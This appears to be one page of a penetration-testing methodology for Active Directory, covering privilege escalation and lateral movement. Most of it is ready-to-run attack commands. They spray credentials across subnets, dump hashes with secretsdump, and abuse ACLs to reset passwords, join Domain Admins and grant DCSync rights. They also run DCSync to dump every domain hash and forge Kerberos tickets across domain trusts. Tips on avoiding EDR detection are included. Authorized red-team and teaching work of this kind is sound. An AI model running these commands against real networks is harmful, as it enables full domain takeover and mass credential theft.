# Phase 5: Privilege Escalation & Lateral Movement

## Gate: Domain Admin achieved OR all paths documented as blocked

## Steps

### 5.1 BloodHound Shortest Paths
```bash
# Key queries (run after each new credential):
# 1. Shortest path from owned principals to Domain Admins
# 2. Shortest path from owned principals to high-value targets
# 3. Find computers where owned users have local admin

# Mark owned principals in BloodHound after each cred
# Right-click → Mark as Owned
```

### 5.2 Local Admin Reuse
```bash
# Test cracked/harvested creds across all hosts
crackmapexec smb <subnet>/24 -u admin -p 'Pass123' --local-auth
crackmapexec smb <subnet>/24 -u admin -H <nthash> --local-auth

# If local admin on any host → dump more creds
impacket-secretsdump admin@<target> -hashes :<nthash>
```

### 5.3 ACL-Based Attacks
```bash
# GenericAll on user → reset password or set SPN
net rpc password "targetuser" "NewPass123!" -U 'DOMAIN/attacker%pass' -S <DC>

# GenericAll on group → add yourself
net rpc group addmem "Domain Admins" attacker -U 'DOMAIN/attacker%pass' -S <DC>

# WriteDACL → grant yourself DCSync rights
impacket-dacledit -action write -rights DCSync -principal attacker -target-dn "DC=corp,DC=local" DOMAIN/user:pass

# ForceChangePassword
rpcclient -U 'attacker%pass' <DC> -c 'setuserinfo2 targetuser 23 NewPass123!'

# AddMember (write to group)
bloodyAD -d corp.local -u attacker -p pass --host <DC> add groupMember "Domain Admins" attacker
```

### 5.4 DCSync (ultimate goal)
```bash
# Need: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
impacket-secretsdump -just-dc DOMAIN/admin:pass@<DC>
# Dumps ALL domain hashes including krbtgt

# Or specific user only
impacket-secretsdump -just-dc-user Administrator DOMAIN/admin:pass@<DC>
```

### 5.5 Lateral Movement Techniques

| Technique | Tool | Stealth | Requirement |
|-----------|------|---------|-------------|
| PSExec | impacket-psexec | Low (creates service) | Local admin |
| WMIExec | impacket-wmiexec | Medium | Local admin |
| SMBExec | impacket-smbexec | Medium | Local admin |
| ATExec | impacket-atexec | Medium | Local admin |
| DCOM | impacket-dcomexec | High | Local admin |
| WinRM | evil-winrm | High | WinRM enabled + local admin |
| RDP | xfreerdp | High (GUI) | RDP + local admin or RDP group |
| Pass-the-Hash | any impacket tool with -hashes | — | NT hash |
| Pass-the-Ticket | export KRB5CCNAME | — | .ccache file |

### 5.6 Domain Trust Exploitation
```bash
# Enumerate trusts
nltest /domain_trusts
# Or: Get-ADTrust -Filter * (PowerShell)

# Child → Parent (SID History injection)
# Need krbtgt hash of child domain
impacket-ticketer -nthash <child_krbtgt> -domain child.corp.local \
  -domain-sid <child_SID> -extra-sid <parent_enterprise_admins_SID> Administrator

# Forest trust: limited (SID filtering) but external trusts may allow lateral
```

### 5.7 Attack Path Documentation
For each successful path, document:
1. Starting point (initial access user)
2. Each hop (what privilege, what technique, what target)
3. Final outcome (DA, DCSync, specific data access)
4. Evidence at each step (screenshot, command output)

## Pitfalls
- PSExec: creates a service (noisy, EDR catches it) — prefer WMIExec/DCOM
- Pass-the-Hash: only works with NT hash, NOT NTLMv2 hash from Responder
- DCSync: requires replication rights — if you have GenericAll on domain, grant yourself first
- Over-permissive cleanup: if you added yourself to DA, REMOVE before engagement ends
